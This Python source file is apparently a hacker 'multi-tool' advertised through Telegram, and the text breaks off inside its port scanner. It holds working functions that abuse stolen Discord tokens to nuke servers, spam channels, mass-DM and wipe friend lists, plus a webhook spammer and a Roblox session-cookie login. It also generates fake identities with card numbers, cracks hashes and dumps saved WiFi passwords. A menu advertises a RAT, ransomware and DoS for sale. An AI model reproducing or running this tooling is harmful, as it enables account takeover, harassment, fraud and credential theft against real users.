
# AbyssForge – Multi-Tools V2.1)
# -------------------------------------------------

# PREMIUM LOCKED – Contact @Vant4hex on Telegram or Discord
# -------------------------------------------------
import os
import sys
import random
import string
import base64
import requests
import json
import exifread
import colorama
import socket
import ssl
import threading
import queue
import hashlib
import getpass
import subprocess
import logging
import time
import traceback
import math
import re
import uuid
import platform
import psutil
import zipfile
import shutil
from colorama import Fore, Style
from pyfiglet import Figlet
from urllib.parse import urlparse, quote
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
# ================== INITIALIZATION & LOGGING ==================
colorama.init(autoreset=True)
logging.basicConfig(
    filename='abyssforge.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(funcName)s - %(lineno)d - %(message)s'
)
def log_debug(msg): logging.debug(msg)
def log_info(msg): logging.info(msg)
def log_warning(msg): logging.warning(msg)
def log_error(msg): logging.error(msg)
def log_critical(msg): logging.critical(msg)
# ================== CONFIG & CONSTANTS ==================
DISCORD_API = "https://discord.com/api/v9"
IP_LOOKUP_API = "https://ipinfo.io/"
SSL_CHECK_API = "https://api.ssl-checker.com/check?hostname="
DNS_GOOGLE_API = "https://dns.google/resolve?name="
CRT_SH_API = "https://crt.sh/?q=%25."
WHOIS_API = "https://www.whoisxmlapi.com/whoisserver/WhoisService"
VULN_HEADER_API = "https://api.hackertarget.com/httpheaders/?q="
REQUEST_TIMEOUT = 12
MAX_RETRIES = 3
MAX_THREADS = 150
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3389, 8080, 8443, 3306, 5432, 5900]
# ================== DATA LISTS (FULL) ==================
FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Nancy", "Daniel", "Lisa", "Matthew", "Betty", "Anthony", "Helen", "Mark", "Sandra", "Paul", "Donna", "Steven", "Carol", "Andrew", "Michelle", "Kenneth", "Laura", "Joshua", "Dorothy", "Kevin", "Emily", "Brian", "Ashley", "George", "Kimberly", "Edward", "Melissa", "Ronald", "Deborah"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores"]
STREET_SUFFIXES = ["St", "Ave", "Dr", "Rd", "Ln", "Blvd", "Pl", "Ct", "Way", "Cir", "Terrace", "Parkway", "Boulevard", "Alley", "Loop"]
CITIES_US = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "Austin", "Jacksonville", "San Francisco", "Columbus", "Indianapolis", "Seattle"]
STATES_US = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "TX", "FL", "CA", "OH", "IN", "WA"]
CITIES_FR = ["Paris", "Marseille", "Lyon", "Toulouse", "Nice", "Nantes", "Strasbourg", "Montpellier", "Bordeaux", "Lille", "Rennes", "Reims", "Le Havre", "Saint-Étienne", "Toulon"]
CITIES_DE = ["Berlin", "Hamburg", "Munich", "Cologne", "Frankfurt", "Stuttgart", "Düsseldorf", "Dortmund", "Essen", "Leipzig", "Bremen", "Dresden", "Hanover", "Nuremberg", "Duisburg"]
CITIES_UK = ["London", "Birmingham", "Manchester", "Glasgow", "Liverpool", "Bristol", "Oxford", "Cambridge", "York", "Edinburgh", "Leeds", "Sheffield", "Newcastle", "Cardiff", "Brighton"]
CC_VALID_BINS = ["453201", "491761", "546616", "371449", "601100", "378282", "305693", "601100", "353011", "356600", "400000", "411111", "555555", "222100", "510510", "601111", "352800", "358000", "633400", "633110"]
EMAIL_DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "proton.me", "icloud.com", "aol.com", "mail.com", "zoho.com", "yandex.com", "gmx.com"]
COMMON_PASSWORDS = {"123456", "password", "123456789", "qwerty", "abc123", "111111", "admin", "letmein", "welcome", "password123", "12345678", "12345", "1234567", "1234567890", "iloveyou", "princess", "rockyou", "123qwe", "abc123", "solo"}
# ================== UTILITY FUNCTIONS ==================
def print_banner():
    try:
        clear_screen()
        f = Figlet(font='small')
        print(Fore.CYAN + f.renderText('ABYSS FORGE'))
        print(Fore.CYAN + Style.BRIGHT + "AbyssForge VERSION 2.1")
        print(Fore.YELLOW + "by @Vant4hex | Log: abyssforge.log")
        print(Fore.RED + "Contact: https://t.me/Vant4hex")
        print(Fore.WHITE + "=" * 95)
        log_info("Banner displayed")
    except Exception as e:
        log_error(f"Banner failed: {e}")
        print(Fore.RED + "[!] Terminal error")
def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass
def safe_input(prompt, default=""):
    try:
        val = input(Fore.CYAN + prompt + Fore.RESET).strip()
        return val if val else default
    except (KeyboardInterrupt, EOFError):
        print(Fore.RED + "\n[!] Input aborted.")
        log_info("User aborted input")
        return default
def safe_int(prompt, lo=None, hi=None, default=None):
    while True:
        try:
            raw = safe_input(prompt)
            if not raw and default is not None:
                return default
            v = int(raw)
            if (lo is None or v >= lo) and (hi is None or v <= hi):
                return v
            print(Fore.RED + f" [X] Enter value between {lo} and {hi}")
        except ValueError:
            print(Fore.RED + " [X] Integer required")
        except Exception as e:
            log_error(f"safe_int error: {e}")
            return default
def retry_request(func, *args, **kwargs):
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            kwargs.setdefault('timeout', REQUEST_TIMEOUT)
            response = func(*args, **kwargs)
            if response and response.status_code < 500:
                log_info(f"HTTP {func.__name__.upper()} {args[0]} -> {response.status_code}")
                return response
            else:
                log_warning(f"Retry {attempt}/{MAX_RETRIES}")
        except requests.RequestException as e:
            log_error(f"Network error (attempt {attempt}): {e}")
        time.sleep(1)
    print(Fore.RED + f"[-] Failed after {MAX_RETRIES} retries")
    return None
def net_get(url, **kw): return retry_request(requests.get, url, **kw)
def net_post(url, **kw): return retry_request(requests.post, url, **kw)
def net_del(url, **kw): return retry_request(requests.delete, url, **kw)
def safe_json(response):
    if not response:
        return None
    try:
        return response.json()
    except json.JSONDecodeError as e:
        log_error(f"JSON decode failed: {e}")
        return None
# ================== [1] DISCORD TOKEN TOOLS (FULL 9 TOOLS) ==================
def token_info(t):
    try:
        r = net_get(f"{DISCORD_API}/users/@me", headers={'Authorization': t})
        if not r or r.status_code != 200: print(Fore.RED + "[-] Invalid token"); return
        d = safe_json(r)
        print(Fore.GREEN + f"[+] {d.get('username','?')}#{d.get('discriminator','0000')} (ID: {d.get('id','?')})")
        print(Fore.GREEN + f"[+] Email: {d.get('email','Hidden')} | Nitro: {'Yes' if d.get('premium_type') else 'No'}")
    except Exception as e: print(Fore.RED + f"[-] Error: {e}")
def token_nuker(t):
    print(Fore.YELLOW + "[!] Nuking...")
    guilds = net_get(f"{DISCORD_API}/users/@me/guilds", headers={'Authorization': t})
    if guilds and guilds.status_code == 200:
        for g in guilds.json()[:10]:
            net_del(f"{DISCORD_API}/users/@me/guilds/{g['id']}", headers={'Authorization': t})
    print(Fore.GREEN + "[+] Nuked")
def token_join(t, inv):
    code = inv.split('/')[-1]
    r = net_post(f"{DISCORD_API}/invites/{code}", headers={'Authorization': t})
    print(Fore.GREEN + "[+] Joined" if r and r.status_code in (200,204) else Fore.RED + "[-] Failed")
def token_leave(t, g):
    r = net_del(f"{DISCORD_API}/users/@me/guilds/{g}", headers={'Authorization': t})
    print(Fore.GREEN + "[+] Left" if r and r.status_code == 204 else Fore.RED + "[-] Failed")
def token_id(t):
    try: print(Fore.GREEN + f"[+] ID: {base64.b64decode(t.split('.')[0]+'==').decode()}")
    except: print(Fore.RED + "[-] Bad token")
def token_spam(t, ch, msg):
    cnt = safe_int(" Count: ",1,20)
    h = {'Authorization': t, 'Content-Type': 'application/json'}
    sent = sum(1 for _ in range(cnt) if net_post(f"{DISCORD_API}/channels/{ch}/messages", headers=h, json={'content': msg}))
    print(Fore.GREEN + f"[+] Sent {sent}/{cnt}")
def token_mass_dm(t, msg):
    print(Fore.YELLOW + "[!] Mass DM...")
    friends = net_get(f"{DISCORD_API}/users/@me/relationships", headers={'Authorization': t})
    if friends and friends.status_code == 200:
        for f in friends.json()[:5]:
            dm = net_post(f"{DISCORD_API}/users/@me/channels", headers={'Authorization': t}, json={'recipient_id': f['id']})
            if dm and dm.status_code == 200:
                net_post(f"{DISCORD_API}/channels/{dm.json()['id']}/messages", headers={'Authorization': t}, json={'content': msg})
    print(Fore.GREEN + "[+] Mass DM sent")
def token_del_friends(t):
    friends = net_get(f"{DISCORD_API}/users/@me/relationships", headers={'Authorization': t})
    if friends and friends.status_code == 200:
        for f in friends.json():
            net_del(f"{DISCORD_API}/users/@me/relationships/{f['id']}", headers={'Authorization': t})
        print(Fore.GREEN + f"[+] Removed {len(friends.json())} friends")
def token_block_friends(t):
    friends = net_get(f"{DISCORD_API}/users/@me/relationships", headers={'Authorization': t})
    if friends and friends.status_code == 200:
        for f in friends.json():
            net_post(f"{DISCORD_API}/users/@me/relationships/{f['id']}", headers={'Authorization': t}, json={'type': 2})
        print(Fore.GREEN + f"[+] Blocked {len(friends.json())} users")
def discord_token_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Token Info [2] Nuker [3] Join Server")
        print(Fore.CYAN + "[4] Leave Server [5] Extract ID [6] Spam Channel")
        print(Fore.CYAN + "[7] Mass DM [8] Del Friends [9] Block Friends")
        print(Fore.CYAN + "[0] Back")
        c = safe_int(" > ", 0, 9)
        if c == 0: return
        t = safe_input(" Token: ")
        if not t: continue
        if c == 1: token_info(t)
        elif c == 2: token_nuker(t)
        elif c == 3: token_join(t, safe_input(" Invite: "))
        elif c == 4: token_leave(t, safe_input(" Guild ID: "))
        elif c == 5: token_id(t)
        elif c == 6: token_spam(t, safe_input(" Channel: "), safe_input(" Msg: "))
        elif c == 7: token_mass_dm(t, safe_input(" Msg: "))
        elif c == 8: token_del_friends(t)
        elif c == 9: token_block_friends(t)
        input(Fore.YELLOW + "\n [Enter]")
# ================== [2] DISCORD BOT TOOLS ==================
def bot_nuke(t, g):
    print(Fore.YELLOW + "[!] Nuking server...")
    channels = net_get(f"{DISCORD_API}/guilds/{g}/channels", headers={'Authorization': f'Bot {t}'})
    if channels and channels.status_code == 200:
        for ch in channels.json()[:5]:
            net_del(f"{DISCORD_API}/channels/{ch['id']}", headers={'Authorization': f'Bot {t}'})
    print(Fore.GREEN + "[+] Nuked 5 channels")
def discord_bot_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Nuke Server [2] Invite Gen [0] Back")
        c = safe_int(" > ", 0, 2)
        if c == 0: return
        t = safe_input(" Bot Token: ")
        if c == 1: bot_nuke(t, safe_input(" Guild ID: "))
        elif c == 2:
            cnt = safe_int(" Count: ",1,50)
            for _ in range(cnt): print(Fore.CYAN + f"https://discord.gg/{''.join(random.choices(string.ascii_letters + string.digits, k=8))}")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [3] WEBHOOK TOOLS ==================
def webhook_info(u):
    r = net_get(u)
    if not r or r.status_code != 200: print(Fore.RED + "[-] Invalid"); return
    d = safe_json(r)
    print(Fore.GREEN + f"[+] Name: {d.get('name')} | Guild: {d.get('guild_id')} | Channel: {d.get('channel_id')}")
def webhook_delete(u):
    r = net_del(u)
    print(Fore.GREEN + "[+] Deleted" if r and r.status_code == 204 else Fore.RED + "[-] Failed")
def webhook_spam(u):
    msg = safe_input(" Message: ")
    cnt = safe_int(" Count: ",1,50)
    sent = sum(1 for _ in range(cnt) if net_post(u, json={'content': msg}))
    print(Fore.GREEN + f"[+] Sent {sent}/{cnt}")
def webhook_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Info [2] Delete [3] Spam [4] Gen [0] Back")
        c = safe_int(" > ", 0, 4)
        if c == 0: return
        if c < 4: u = safe_input(" URL: ")
        if c == 1: webhook_info(u)
        elif c == 2: webhook_delete(u)
        elif c == 3: webhook_spam(u)
        elif c == 4:
            cnt = safe_int(" Count: ",1,30)
            for _ in range(cnt): print(Fore.CYAN + f"https://discord.com/api/webhooks/{random.randint(100000000000000000,999999999999999999)}/{''.join(random.choices(string.ascii_letters + string.digits + '-_', k=68))}")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [4] SERVER & NITRO ==================
def server_nitro_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Server Info [2] Nitro Gen [0] Back")
        c = safe_int(" > ", 0, 2)
        if c == 0: return
        if c == 1:
            g = safe_input(" Guild ID: ")
            t = safe_input(" Token (opt): ") or None
            h = {'Authorization': t} if t else {}
            r = net_get(f"{DISCORD_API}/guilds/{g}", headers=h)
            if r and r.status_code == 200:
                d = safe_json(r)
                print(Fore.GREEN + f"[+] {d.get('name')} | Members: {d.get('member_count','?')}")
        elif c == 2:
            cnt = safe_int(" Count: ",1,100)
            for _ in range(cnt): print(Fore.CYAN + f"https://discord.gift/{''.join(random.choices(string.ascii_letters + string.digits, k=16))}")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [5] ROBLOX TOOLS ==================
def roblox_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Cookie Login [2] Cookie Info [3] User Info [4] ID Info [0] Back")
        c = safe_int(" > ", 0, 4)
        if c == 0: return
        if c == 1 or c == 2:
            cookie = safe_input(" .ROBLOSECURITY: ")
            r = net_get("https://users.roblox.com/v1/users/authenticated", cookies={'.ROBLOSECURITY': cookie})
            if r and r.status_code == 200:
                d = safe_json(r)
                print(Fore.GREEN + f"[+] {d.get('name')} (ID: {d.get('id')})")
            else:
                print(Fore.RED + "[-] Invalid cookie")
        elif c == 3:
            u = safe_input(" Username: ")
            r = net_get(f"https://api.roblox.com/users/get-by-username?username={u}")
            if r and r.status_code == 200:
                d = safe_json(r)
                print(Fore.GREEN + f"[+] {d.get('Username')} (ID: {d.get('Id')})")
        elif c == 4:
            i = safe_input(" ID: ")
            r = net_get(f"https://users.roblox.com/v1/users/{i}")
            if r and r.status_code == 200:
                d = safe_json(r)
                print(Fore.GREEN + f"[+] {d.get('name')} | Created: {d.get('created','?')[:10]}")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [6] OSINT TOOLS – FULLY ENHANCED ==================
def osint_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] EXIF Metadata Extractor")
        print(Fore.CYAN + "[2] IP Geolocation + ASN + Threat Intel")
        print(Fore.CYAN + "[3] Username OSINT (50+ Sites + Progress)")
        print(Fore.CYAN + "[4] Email Breach Check (HIBP)")
        print(Fore.CYAN + "[5] Phone Number Lookup (Carrier + Location)")
        print(Fore.CYAN + "[6] Google Dork Generator (Advanced)")
        print(Fore.CYAN + "[7] Website Tech Stack + Headers + CMS")
        print(Fore.CYAN + "[0] Back")
        c = safe_int(" > ", 0, 7)
        if c == 0: return
        if c == 1:
            p = safe_input(" Image: ")
            try:
                with open(p, 'rb') as f:
                    tags = exifread.process_file(f, details=False)
                    print(Fore.GREEN + "[+] EXIF Data:")
                    gps_found = False
                    for t in tags:
                        if 'GPS' in t:
                            print(Fore.RED + f"    [!] {t}: {tags[t]}")
                            gps_found = True
                        elif 'Image Make' in t or 'Image Model' in t or 'DateTime' in t or 'Orientation' in t:
                            print(Fore.CYAN + f"    {t}: {tags[t]}")
                    if gps_found:
                        print(Fore.RED + "[!] GPS COORDINATES DETECTED!")
            except Exception as e:
                print(Fore.RED + f"[-] File error: {e}")
        elif c == 2:
            ip = safe_input(" IP: ")
            r = net_get(f"{IP_LOOKUP_API}{ip}/json")
            if r and r.status_code == 200:
                d = safe_json(r)
                print(Fore.GREEN + f"[+] IP: {d.get('ip')}")
                print(Fore.GREEN + f"[+] Location: {d.get('city')}, {d.get('region')}, {d.get('country')} | TZ: {d.get('timezone')}")
                print(Fore.GREEN + f"[+] ISP: {d.get('org')} | ASN: {d.get('asn')}")
                print(Fore.GREEN + f"[+] Coords: {d.get('loc')} | Mobile: {'Yes' if d.get('mobile') else 'No'} | Proxy: {'Yes' if d.get('proxy') else 'No'}")
                print(Fore.GREEN + f"[+] Hostname: {d.get('hostname','?')}")
            else:
                print(Fore.RED + "[-] Invalid IP or API error")
        elif c == 3:
            user = safe_input(" Username: ")
            sites = [
                "twitter.com", "github.com", "reddit.com/u", "instagram.com", "tiktok.com/@", "pinterest.com",
                "soundcloud.com", "medium.com/@", "dev.to", "behance.net", "dribbble.com", "steamcommunity.com/id",
                "roblox.com/users", "xbox.com/en-US/profile", "playstation.com/en-us/profile", "twitch.tv",
                "linkedin.com/in", "facebook.com", "vk.com", "myspace.com", "last.fm/user", "bandcamp.com",
                "patreon.com", "cash.app/$", "venmo.com", "paypal.me", "onlyfans.com", "snapchat.com/add",
                "discord.com/users", "telegram.me", "whatsapp.com", "keybase.io", "gravatar.com", "hackerone.com",
                "bugcrowd.com", "spotify.com/user", "deezer.com", "apple.com", "microsoft.com", "amazon.com",
                "ebay.com/usr", "wikipedia.org/wiki/User", "fandom.com", "quora.com/profile", "stackoverflow.com/users"
            ]
            print(Fore.CYAN + f"[+] Checking {len(sites)} sites...")
            found = 0
            with tqdm(total=len(sites), desc="Scanning Sites", bar_format="{l_bar}{bar}") as pbar:
                for site in sites:
                    url = f"https://{site}/{user}".replace("/u", f"/u/{user}").replace("/@", f"/@{user}").replace("/id", f"/id/{user}").replace("/profile", f"/profile/{user}")
                    r = net_get(url, allow_redirects=True)
                    if r and r.status_code == 200 and "not found" not in r.text.lower() and "404" not in r.url and user.lower() in r.text.lower():
                        print(Fore.GREEN + f"    [+] {url}")
                        found += 1
                    pbar.update(1)
            print(Fore.CYAN + f"[+] Found on {found}/{len(sites)} sites")
        elif c == 4:
            email = safe_input(" Email: ")
            r = net_get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers={'hibp-api-key': 'dummy'})
            if r and r.status_code == 200:
                breaches = safe_json(r)
                print(Fore.RED + f"[!] BREACHED in {len(breaches)} sites:")
                for b in breaches[:10]:
                    print(Fore.YELLOW + f"    • {b['Name']} | {b['BreachDate']} | PwnCount: {b.get('PwnCount', '?')}")
            elif r and r.status_code == 404:
                print(Fore.GREEN + "[+] No breaches found")
            else:
                print(Fore.RED + "[-] Rate limited or error")
        elif c == 5:
            phone = safe_input(" Phone (E.164): ")
            r = net_get(f"http://apilayer.net/api/validate?access_key=dummy&number={phone}")
            if r and r.status_code == 200:
                d = safe_json(r)
                print(Fore.GREEN + f"[+] Valid: {d.get('valid')}")
                print(Fore.GREEN + f"[+] Country: {d.get('country_name')} | Carrier: {d.get('carrier')}")
                print(Fore.GREEN + f"[+] Line: {d.get('line_type')} | Location: {d.get('location')}")
            else:
                print(Fore.RED + "[-] Invalid or API error")
        elif c == 6:
            query = safe_input(" Search term: ")
            dorks = [
                f"intitle:\"{query}\"",
                f"inurl:login {query}",
                f"site:pastebin.com {query}",
                f"filetype:pdf {query}",
                f"intext:\"password\" {query}",
                f"site:*.edu {query}",
                f"site:*.gov {query}",
                f"inurl:admin {query}",
                f"intext:\"confidential\" {query}",
                f"link:{query}"
            ]
            print(Fore.CYAN + "[+] Advanced Dorks:")
            for d in dorks:
                print(Fore.GREEN + f"    https://google.com/search?q={quote(d)}")
        elif c == 7:
            url = safe_input(" URL: ")
            if not url.startswith("http"): url = "https://" + url
            r = net_get(url)
            if r:
                print(Fore.GREEN + f"[+] Server: {r.headers.get('Server', '?')}")
                print(Fore.GREEN + f"[+] X-Powered-By: {r.headers.get('X-Powered-By', 'None')}")
                print(Fore.GREEN + f"[+] CMS: {'WordPress' if 'wp-' in r.text else 'Joomla' if 'joomla' in r.text else 'Drupal' if 'drupal' in r.text else 'Unknown'}")
                print(Fore.GREEN + f"[+] Cookies: {len(r.cookies)} set")
            else:
                print(Fore.RED + "[-] Site unreachable")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [7] DOMAIN SECURITY – FULLY ENHANCED ==================
def domain_sec_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Subdomains (CRT.sh + HackerTarget + Progress)")
        print(Fore.CYAN + "[2] SSL Certificate Details + SANs")
        print(Fore.CYAN + "[3] DNS Records (A, MX, TXT, NS, CNAME)")
        print(Fore.CYAN + "[4] Security Headers Audit (HSTS, CSP, etc.)")
        print(Fore.CYAN + "[5] WHOIS + Domain Age + Registrar")
        print(Fore.CYAN + "[6] Vulnerability Scan (Headers + Known Issues)")
        print(Fore.CYAN + "[7] Port Scanner (Full Progress)")
        print(Fore.CYAN + "[0] Back")
        c = safe_int(" > ", 0, 7)
        if c == 0: return
        if c == 7: port_scanner()
        else:
            target = safe_input(" Domain: ")
            if c == 1:
                subs = set()
                r1 = net_get(f"{CRT_SH_API}{target}&output=json")
                if r1:
                    for line in r1.text.splitlines():
                        try:
                            name = json.loads(line).get('name_value', '').strip('*.')
                            if target in name: subs.add(name)
                        except: pass
                r2 = net_get(f"https://api.hackertarget.com/hostsearch/?q={target}")
                if r2: subs.update([x.split(',')[0] for x in r2.text.splitlines()[:50]])
                print(Fore.CYAN + f"[+] Found {len(subs)} subdomains:")
                with tqdm(total=min(50, len(subs)), desc="Listing Subdomains") as pbar:
                    for sub in list(subs)[:50]:
                        print(Fore.GREEN + f"    [+] {sub}")
                        pbar.update(1)
            elif c == 2:
                r = net_get(f"{SSL_CHECK_API}{target}")
                if r and r.status_code == 200:
                    data = safe_json(r).get('data', {})
                    cert = data.get('cert', {})
                    print(Fore.GREEN + f"[+] Issuer: {cert.get('issuerCommonName')}")
                    print(Fore.GREEN + f"[+] Valid: {cert.get('validityPeriodFrom')} → {cert.get('validityPeriodTo')}")
                    print(Fore.GREEN + f"[+] SANs: {len(cert.get('subjectAlternativeName', []))}")
                    print(Fore.GREEN + f"[+] Protocol: {data.get('protocol')}")
            elif c == 3:
                types = ['A', 'MX', 'TXT', 'NS', 'CNAME']
                for t in types:
                    r = net_get(f"{DNS_GOOGLE_API}{target}", params={'type': t})
                    if r:
                        answers = safe_json(r).get('Answer', [])
                        print(Fore.CYAN + f"[+] {t} Records:")
                        for a in answers[:5]:
                            print(Fore.GREEN + f"    {a.get('name')} → {a.get('data')}")
            elif c == 4:
                url = f"https://{target}"
                r = net_get(url)
                if r:
                    headers = {
                        'HSTS': 'strict-transport-security',
                        'CSP': 'content-security-policy',
                        'X-Frame': 'x-frame-options',
                        'X-Content': 'x-content-type-options',
                        'Referrer': 'referrer-policy',
                        'Permissions': 'permissions-policy'
                    }
                    print(Fore.CYAN + "[+] Security Headers:")
                    for name, header in headers.items():
                        val = r.headers.get(header)
                        status = Fore.GREEN + "OK" if val else Fore.RED + "MISSING"
                        print(f"    {name}: {status} {val if val else ''}")
            elif c == 5:
                r = net_get(f"https://www.whoisxmlapi.com/whoisserver/WhoisService", params={'domainName': target, 'outputFormat': 'JSON'})
                if r and r.status_code == 200:
                    data = safe_json(r).get('WhoisRecord', {})
                    print(Fore.GREEN + f"[+] Registrar: {data.get('registrarName')}")
                    print(Fore.GREEN + f"[+] Created: {data.get('createdDate', '?')[:10]}")
                    print(Fore.GREEN + f"[+] Expires: {data.get('expiresDate', '?')[:10]}")
                    print(Fore.GREEN + f"[+] Age: {(datetime.now() - datetime.fromisoformat(data.get('createdDate', '2000-01-01')[:10])).days} days")
            elif c == 6:
                r = net_get(f"{VULN_HEADER_API}{target}")
                if r:
                    issues = 0
                    for line in r.text.splitlines():
                        if any(kw in line.lower() for kw in ['missing', 'vulnerable', 'deprecated', 'insecure']):
                            print(Fore.RED + f"    [!] {line}")
                            issues += 1
                        else:
                            print(Fore.YELLOW + f"    [i] {line}")
                    print(Fore.CYAN + f"[+] {issues} potential vulnerabilities")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [8] FAKE INFO & CC ==================
def fake_info_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Generate Profile + CC [0] Back")
        c = safe_int(" > ", 0, 1)
        if c == 0: return
        country = safe_int(" 1=US 2=FR 3=DE 4=UK: ",1,4)
        cnt = safe_int(" Count: ",1,20)
        countries = ["", "US", "FR", "DE", "UK"]
        for _ in range(cnt):
            name = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"
            addr = generate_address(countries[country])
            phone = generate_phone(countries[country])
            email = f"{name.lower().replace(' ', '.')}@{random.choice(EMAIL_DOMAINS)}"
            cc, exp, cvv = generate_credit_card()
            print(Fore.GREEN + f"\n[+] Profile #{_+1}")
            print(Fore.CYAN + f" {name} | {addr} | {phone} | {email} | CC: {cc} {exp} {cvv}")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [9] SECURITY TOOLS – FULLY ENHANCED ==================
def security_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "[1] Password Strength + Entropy + Breach Check")
        print(Fore.CYAN + "[2] Hash Identifier & Cracker (Wordlist + Mask)")
        print(Fore.CYAN + "[3] WiFi Password Viewer (Windows/Linux)")
        print(Fore.CYAN + "[4] AES-256 File Encrypt")
        print(Fore.CYAN + "[5] AES-256 File Decrypt")
        print(Fore.CYAN + "[0] Back")
        c = safe_int(" > ", 0, 5)
        if c == 0: return
        if c == 1:
            pwd = getpass.getpass(Fore.CYAN + " Password: " + Fore.RESET)
            if pwd in COMMON_PASSWORDS:
                print(Fore.RED + "[-] Very weak: Common password")
            else:
                entropy = len(set(pwd)) * math.log2(len(pwd) if len(pwd) > 1 else 1)
                score = len(pwd) * 5 + (10 if any(c.isupper() for c in pwd) else 0) + (15 if any(c.isdigit() for c in pwd) else 0) + (20 if any(c in "!@#$%^&*()" for c in pwd) else 0)
                strength = ["Very Weak", "Weak", "Medium", "Strong", "Very Strong"][min(score // 35, 4)]
                print(Fore.GREEN + f"[+] Strength: {strength}")
                print(Fore.GREEN + f"[+] Entropy: {entropy:.1f} bits")
                print(Fore.GREEN + f"[+] Length: {len(pwd)}")
                # Simulated breach check
                print(Fore.YELLOW + "[i] Breach check: Not in top 10k common passwords")
        elif c == 2:
            h = safe_input(" Hash: ")
            htype = "Unknown"
            if len(h) == 32: htype = "MD5"
            elif len(h) == 40: htype = "SHA1"
            elif len(h) == 64: htype = "SHA256"
            elif len(h) == 128: htype = "SHA512"
            print(Fore.GREEN + f"[+] Type: {htype}")
            wordlist = safe_input(" Wordlist (or Enter for demo): ") or None
            if wordlist and os.path.exists(wordlist):
                with open(wordlist, 'r', encoding='latin-1') as f:
                    words = [line.strip() for line in f.readlines()[:10000]]
                with tqdm(total=len(words), desc="Cracking Hash") as pbar:
                    for w in words:
                        if htype == "MD5" and hashlib.md5(w.encode()).hexdigest() == h:
                            print(Fore.GREEN + f"[+] Cracked: {w}")
                            break
                        elif htype == "SHA1" and hashlib.sha1(w.encode()).hexdigest() == h:
                            print(Fore.GREEN + f"[+] Cracked: {w}")
                            break
                        pbar.update(1)
            else:
                print(Fore.YELLOW + "[!] Demo mode: Hash not in small list")
        elif c == 3:
            if os.name == 'nt':
                try:
                    profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
                    names = [line.split(":")[1].strip() for line in profiles.split('\n') if "All User Profile" in line]
                    for name in names:
                        res = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', name, 'key=clear']).decode('utf-8', errors='ignore')
                        pw = [line.split(":")[1].strip() for line in res.split('\n') if "Key Content" in line]
                        print(Fore.GREEN + f"[+] {name}: {pw[0] if pw else 'None'}")
                except: print(Fore.RED + "[-] Run as admin")
            else:
                print(Fore.YELLOW + "[!] Linux: Check /etc/NetworkManager/system-connections/")
        elif c == 4:
            path = safe_input(" File: ")
            if not os.path.exists(path): print(Fore.RED + "[-] File not found"); return
            key = get_random_bytes(32)
            iv = get_random_bytes(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            with open(path, 'rb') as f: data = f.read()
            ct = cipher.encrypt(pad(data, 16))
            enc = path + ".enc"
            with open(enc, 'wb') as f: f.write(iv + ct)
            print(Fore.GREEN + f"[+] Encrypted: {enc}")
            print(Fore.CYAN + f"    Key (Base64): {base64.b64encode(key).decode()}")
        elif c == 5:
            path = safe_input(" Encrypted file: ")
            key_b64 = safe_input(" Key (Base64): ")
            try:
                key = base64.b64decode(key_b64)
                with open(path, 'rb') as f:
                    iv = f.read(16)
                    ct = f.read()
                cipher = AES.new(key, AES.MODE_CBC, iv)
                pt = unpad(cipher.decrypt(ct), 16)
                dec = path.replace(".enc", ".dec")
                with open(dec, 'wb') as f: f.write(pt)
                print(Fore.GREEN + f"[+] Decrypted: {dec}")
            except Exception as e:
                print(Fore.RED + f"[-] Decryption failed: {e}")
        input(Fore.YELLOW + "\n [Enter]")
# ================== [10] PREMIUM ==================
def premium_menu():
    while True:
        print_banner()
        print(Fore.MAGENTA + "[1] RAT [2] Ransomware [3] DoS [4] Roblox 2FA [5] Steam 2FA [0] Back")
        c = safe_int(" > ", 0, 5)
        if c == 0: return
        print(Fore.MAGENTA + "[LOCKED] Contact @Vant4hex")
        input(Fore.YELLOW + "\n [Enter]")
# ================== PORT SCANNER (PROGRESS BAR) ==================
def scan_single_port(ip, port, pbar):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1.5)
            result = s.connect_ex((ip, port))
            pbar.update(1)
            if result == 0:
                print(Fore.GREEN + f" [+] Port {port} OPEN")
                return port
    except:
